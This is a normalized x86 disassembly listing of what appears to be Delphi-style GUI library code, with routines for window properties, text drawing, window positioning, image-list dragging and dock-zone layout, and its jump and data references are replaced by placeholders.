mov ecx [ eax + 0x30 ]
jmp r-xdata
cmp [ esi + 0x94 ] 0x0
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
pop esi
retn
and edx 0x7f
push edx
mov ecx eax
mov eax esi
mov edx 0xb046
call sub_43bcd4
mov esi ecx
mov ecx [ ecx + 0x30 ]
sub_44504c
push ebx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call RemovePropA
pop ebx
retn
sub_44507c
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx [ esi + 0x94 ]
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_442630
dec eax
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4450b4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
test bl bl
je r-xdata
and [ ebp + 0x54 ] 0xdfff
or [ ebp + 0x54 ] 0x2000
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x1d0 ]
test eax eax
je r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebp + 0x1d0 ]
call sub_4167c8
mov edx ebx
call sub_4450b4
inc edi
dec esi
jne r-xdata
sub_445100
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
test [ ebx + 0x1c ] 0x2
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x48 ]
mov [ esi ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4 ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x242 ]
mov [ esi ] eax
mov eax [ ebx + 0x246 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_44517c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
push ebp
push sub_4451ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c01c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4451f3
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
sub_4451f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445a5c
mov edx 0x80ffff
mov eax esi
call sub_43c2e8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x250 ]
call sub_424478
mov eax [ esi + 0x250 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_423fe4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_445264
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_440104
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40e3dc
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44009c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_4452d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445326
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44532d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ReleaseDC
retn
sub_445334
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4453cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
call sub_42360c
mov eax ebx
call sub_43ea6c
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43c148
mov eax [ ebp - 0x14 ]
call sub_405324
push eax
mov eax [ ebx + 0x250 ]
call sub_42455c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453d4
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
sub_4453dc
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x109
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44544c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4454d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_444ff0
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454de
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c148
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x250 ]
call sub_4243b8
mov edx eax
add edx 0x6
mov eax ebx
call sub_43b830
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43c148
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_4243d4
mov edx eax
add edx 0x4
mov eax ebx
call sub_43b864
sub_4454e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x1
xor edx edx
push ebp
push sub_4456c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c178
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43d4a8
mov eax [ esi ]
call sub_455f78
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_455f84
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_455f78
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_455f6c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_455f84
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_455f60
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_455f6c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x25c ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_455f60
mov [ ebp - 0xc ] eax
xor eax eax
mov eax ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_440af8
push 0x4
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4456cf
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] 0x0
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x64
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test al al
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_448ca4
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call [ rw-data ]
sub_4456d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445700
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_415370
mov eax esi
call sub_43ea6c
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
mov eax [ esi + 0x250 ]
call sub_42455c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44575c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_415370
call sub_42f0b8
call sub_42f1c0
test al al
jne r-xdata
call sub_42f0b8
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42f400
push esp
push 0x1
push 0xf
push 0x0
call sub_42f0b8
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42f230
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4457c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_441a00
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
pop esi
pop ebx
retn
sub_4457f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445830
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_449c3c
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44589c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_449b00
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_445910
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_445830
mov eax [ rw-data ]
mov eax [ eax ]
movzx eax [ eax + 0x44 ]
mov [ esi + 0x7c ] ax
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x68 ]
call sub_456478
sub_445910
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_449b00
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_445974
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4457f0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_445974
push ebx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_445998
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_4457f0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_445a0c
push ebx
push esi
mov esi eax
mov eax esi
call sub_449b00
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_445974
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_445878
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x7c ]
call sub_456478
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_445a5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43edc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov esi eax
mov [ ebx + 0x250 ] esi
mov eax esi
mov edx ebx
call sub_43a9e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_445ab8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_445b08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_4242e0
xor eax eax
push ebp
push sub_445ba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx ebx
call sub_4245e4
xor eax eax
push ebp
push sub_445b83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_43a9fc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445b8a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor edx edx
call sub_4245e4
retn
sub_445bb8
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_445c54
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_445bd4
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_445c30
push ebx
push esi
xor esi esi
call sub_446278
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_446250
mov ebx eax
inc esi
test ebx ebx
jne r-xdata
sub_445c54
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_446278
mov esi eax
test esi esi
je r-xdata
movzx ebx [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_445c54
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_445c8c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_445d1c
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov edx 0x2
call sub_445d1c
jmp r-xdata
retn
sub_445cd4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_445da0
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov edx 0x2
call sub_445da0
jmp r-xdata
retn
sub_445d1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp ebx [ eax + 0x64 ]
jne r-xdata
mov eax edi
mov ebp [ ebx + 0x14 ]
cmp al [ ebp + 0x10 ]
jne r-xdata
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
dec al
je r-xdata
mov ebx ebp
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_446174
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
sub_445da0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ebp [ esp + 0x8 ]
sub ebp [ esp ]
jmp r-xdata
mov ebp [ esp + 0xc ]
sub ebp [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_445c30
dec eax
jne r-xdata
mov eax edi
mov edx [ esi + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi [ esi + 0x14 ]
mov eax esi
call sub_446174
mov ebp eax
mov eax esi
call sub_445c8c
sub ebp eax
jmp r-xdata
mov eax edx
call sub_446174
mov ebp eax
mov ebp [ eax + 0x68 ]
jmp r-xdata
sub_445e58
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_445c30
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_446278
mov ebx eax
movzx eax [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_445da0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_445c30
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_445da0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_445c8c
mov edx eax
add edx esi
mov eax ebx
call sub_44619c
mov edx edi
mov eax ebx
call sub_44619c
jmp r-xdata
mov eax ebx
call sub_445ff8
mov eax ebx
call sub_446250
mov ebx eax
test ebx ebx
jne r-xdata
sub_445f00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404e44
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404e98
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
sub_445f44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb7
call sub_404160
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_445fb5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43cf48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_445fc8
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_446250
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_445ff8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
mov [ eax + 0x90 ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_445da0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445da0
mov esi eax
push ebp
call sub_445fc8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446250
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_445d1c
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_445d1c
mov ecx ebx
pop edx
call sub_415398
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
